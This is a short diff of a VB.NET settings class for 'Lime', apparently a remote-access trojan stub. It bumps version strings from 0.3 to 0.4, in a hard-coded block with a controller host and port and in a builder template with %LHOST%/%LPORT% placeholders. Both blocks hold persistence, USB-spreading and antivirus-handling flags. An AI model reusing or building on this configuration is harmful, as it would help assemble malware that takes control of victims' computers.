@@ -8,11 +8,11 @@ Namespace Lime
         Public Shared LHOST As String = "192.168.1.233"
         Public Shared LPORT As Integer = "1111"
         Public Shared SPL As String = "'L'"
-        Public Shared LVER As String = "Stub 0.3.1A"
+        Public Shared LVER As String = "Stub 0.4"
         Public Shared LEXE As String = "Stub.exe"
         Public Shared STUPNAME As String = "Startupme"
         Public Shared NMT As Threading.Mutex = Nothing
-        Public Shared MTX As String = "Lime_Controller_v0.3"
+        Public Shared MTX As String = "Lime_Controller_v0.4"
         Public Shared SPUSB As Boolean = False
         Public Shared ANTIV As Boolean = False
         Public Shared DRCHK As Boolean = False
@@ -25,11 +25,11 @@ Namespace Lime
         Public Shared LHOST As String = "%LHOST%"
         Public Shared LPORT As Integer = "%LPORT%"
         Public Shared SPL As String = "'L'"
-        Public Shared LVER As String = "Stub 0.3.1A"
+        Public Shared LVER As String = "Stub 0.4"
         Public Shared LEXE As String = "%LEXE%"
         Public Shared STUPNAME As String = "%STNAME%"
         Public Shared NMT As Threading.Mutex = Nothing
-        Public Shared MTX As String = "Lime_Controller_v0.3"
+        Public Shared MTX As String = "Lime_Controller_v0.4"
         Public Shared SPUSB As Boolean = "%SPUSB%"
         Public Shared ANTIV As Boolean = "%ANTIV%"
         Public Shared DRCHK As Boolean = "%DRCHK%"
